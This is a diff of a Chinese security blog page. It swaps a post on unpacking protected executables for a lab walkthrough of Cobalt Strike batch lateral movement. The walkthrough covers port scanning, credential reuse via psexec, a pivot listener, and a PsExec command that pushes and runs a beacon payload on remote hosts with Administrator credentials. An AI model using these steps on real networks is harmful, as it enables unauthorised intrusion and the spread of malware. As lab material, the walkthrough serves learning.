@@ -2,9 +2,9 @@
 <html>
 <head><meta name="generator" content="Hexo 3.8.0">
   <meta charset="utf-8">
-  <title>ESP定律 | 九世的博客</title>
-  <meta name="keywords" content="">
-  <meta name="description" content="ESP定律 | 九世的博客">
+  <title>cobal strike内网批量上线 | 九世的博客</title>
+  <meta name="keywords" content=" Writing ">
+  <meta name="description" content="cobal strike内网批量上线 | 九世的博客">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="Become a hacker">
 <meta property="og:type" content="website">
@@ -1239,19 +1239,25 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-ESP定律" class="article article-type-post" itemscope="" itemprop="blogPost">
+        <article id="post-cobal-strike内网批量上线" class="article article-type-post" itemscope="" itemprop="blogPost">
     
-        <h1 class="article-title">ESP定律</h1>
+        <h1 class="article-title">cobal strike内网批量上线</h1>
     
     <div class="article-meta">
         
         
         
+        
+        <span class="tag">
+            
+            <a href="javascript:" class="color3">Writing</a>
+            
+        </span>
         
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title="更新时间: 2019-04-19 20:36:16">2018-08-26 16:20</time>
+        创建时间:<time class="date" title="更新时间: 2020-01-06 09:38:37">2020-01-06 09:05</time>
         
     </div>
     <div class="article-meta">
@@ -1273,7 +1279,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言："><span class="toc-text">前言：</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#正文："><span class="toc-text">正文：</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#环境"><span class="toc-text">环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#内网可出网"><span class="toc-text">内网可出网</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#内网不可出网"><span class="toc-text">内网不可出网</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考链接"><span class="toc-text">参考链接</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -1288,12 +1294,27 @@
 </div>
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>Shark恒的教程，学到第四课，自验证涉及到ESP定律进行脱壳。然后我去看了一遍，发现还行。这里做个总结。</p>
-<p><img src="https://ss2.bdstatic.com/70cFvnSh_Q1YnxGkpoWK1HF6hhy/it/u=4065195853,3923124275&amp;fm=11&amp;gp=0.jpg" alt=""></p>
-<pre><code>全职猎人看到了嵌合蚁篇
-</code></pre><h2 id="正文："><a href="#正文：" class="headerlink" title="正文："></a>正文：</h2><p>首先这里自己找个exe用吾爱工具的，ASP加壳工具进行加壳。用PEID查壳可以发现是ASP壳<br><img src="https://i.imgur.com/AP2j6lR.png" alt=""><br>拖入OD，并进行一次单步，发现有Pushad而且单步之后也只有ESP后面出现红色说明可以使用ESP定律进行脱壳<br><img src="https://i.imgur.com/k2RDX53.png" alt=""><br>然后将鼠标移到ESP值那里右键单击数据窗口中跟随<br><img src="https://i.imgur.com/8aQCmo2.png" alt=""><br>选中跟随的值，多少无所谓只要是开头的就行<br><img src="https://i.imgur.com/uwvXxbY.png" alt=""><br>右键单击断点，硬件断点，三选一<br><img src="https://i.imgur.com/2jsRRPp.png" alt=""><br>断点之后按调试-&gt;硬件断点可以看见<br><img src="https://i.imgur.com/MRJtmJH.png" alt=""><br>按F9运行，然后F8单步(让他跳到call)<br><img src="https://i.imgur.com/mtcu2kb.png" alt=""><br>鼠标右键点击插件进行脱壳，保存<br><img src="https://i.imgur.com/THC7jZC.png" alt=""><br>在次查壳，发现已经脱了。<br><img src="https://i.imgur.com/finyVAV.png" alt=""></p>
-<p>ESP定律还有更简单的方法，就是你单步了之后把鼠标移到ESP值那里选择ESP那个插件，然后步骤同上。</p>
-<p>转载请注明来自：422926799.github.io</p>
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>晚上临睡之前，发现一篇教cs批量上线的博客。看的不错，手动重演了一遍<br><img src="https://timgsa.baidu.com/timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1578283165678&amp;di=951ef97bc927669d5027bfc448699a57&amp;imgtype=0&amp;src=http%3A%2F%2Fb-ssl.duitang.com%2Fuploads%2Fitem%2F201802%2F15%2F20180215122832_A4T5H.jpeg" alt="timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1578283165678&amp;di=951ef97bc927669d5027bfc448699a57&amp;imgtype=0&amp;src=http%3A%2F%2Fb-ssl.duitang.com%2Fuploads%2Fitem%2F201802%2F15%2F20180215122832_A4T5H.jpeg"></p>
+<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>环境：</p>
+<pre><code>windows 2008:192.168.241.171
+windows 2008 x2:192.168.241.172
+windows 7:192.168.241.156
+</code></pre><h2 id="内网可出网"><a href="#内网可出网" class="headerlink" title="内网可出网"></a>内网可出网</h2><p>首先windows7上线了，执行一波portscan<br><img src="https://s2.ax1x.com/2020/01/06/lrBiFK.png" alt="lrBiFK.png"></p>
+<p>点击视图-&gt;目标可以看到扫出来开发的机子<br><img src="https://s2.ax1x.com/2020/01/06/lrBeOA.png" alt="lrBeOA.png"></p>
+<p>获取登录密码通过cs自带的psexec执行ipc$批量<br><img src="https://s2.ax1x.com/2020/01/06/lrBaT0.png" alt="lrBaT0.png"></p>
+<p>选中要进行测试的机子<br><img src="https://s2.ax1x.com/2020/01/06/lrB0YT.png" alt="lrB0YT.png"></p>
+<p>选择对应的凭证<br><img src="https://s2.ax1x.com/2020/01/06/lrBXAP.png" alt="lrBXAP.png"></p>
+<p>选择会话（补图）<br><img src="https://s2.ax1x.com/2020/01/06/lrDiBn.png" alt="lrDiBn.png"></p>
+<p>等上线就好<br><img src="https://s2.ax1x.com/2020/01/06/lrDWuj.png" alt="lrDWuj.png"></p>
+<h2 id="内网不可出网"><a href="#内网不可出网" class="headerlink" title="内网不可出网"></a>内网不可出网</h2><p>先将可出网的一台机设置中转<br><img src="https://s2.ax1x.com/2020/01/06/lrreat.png" alt="lrreat.png"></p>
+<p><img src="https://s2.ax1x.com/2020/01/06/lrrKG8.png" alt="lrrKG8.png"></p>
+<p>生成马子，把马子和PsExec传到出网的机子上，之后用PsExec执行命令</p>
+<pre><code>PsExec.exe -accepteula \\192.168.241.171,192.168.241.172 -u Administrator -p xxxxx -d -c C:\Windows\Temp\beacon.exe
+</code></pre><p><img src="https://s2.ax1x.com/2020/01/06/lrrDsJ.png" alt="lrrDsJ.png"></p>
+<p>等上线<br><img src="https://s2.ax1x.com/2020/01/06/lrr2i6.png" alt="lrr2i6.png"></p>
+<p>在上线成功的机子上可以看到是通过192.168.241.156这台机的4444端口流量出网的<br><img src="https://s2.ax1x.com/2020/01/06/lrr4Qe.png" alt="lrr4Qe.png"></p>
+<p>ssh批量登录的方法和图1差不多</p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://payloads.cn/2019/1213/cobaltstrike-advancedbatch-launch.html" target="_blank" rel="noopener">CobaltStrike进阶篇-批量上线 | AnonySec’Blog</a></p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。 </span>
@@ -1303,12 +1324,12 @@
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>ESP定律</p>
+    <p><span class="copy-title">文章标题:</span>cobal strike内网批量上线</p>
     
     <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" title="九世">九世</a></p>
-    <p><span class="copy-title">发布时间:</span>2018-08-26, 16:20:01</p>
-    <p><span class="copy-title">最后更新:</span>2019-04-19, 20:36:16</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/7e162ea7.html" title="ESP定律">http://422926799.github.io/posts/7e162ea7.html</a>
+    <p><span class="copy-title">发布时间:</span>2020-01-06, 09:05:02</p>
+    <p><span class="copy-title">最后更新:</span>2020-01-06, 09:38:37</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/b9889b8f.html" title="cobal strike内网批量上线">http://422926799.github.io/posts/b9889b8f.html</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target="_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
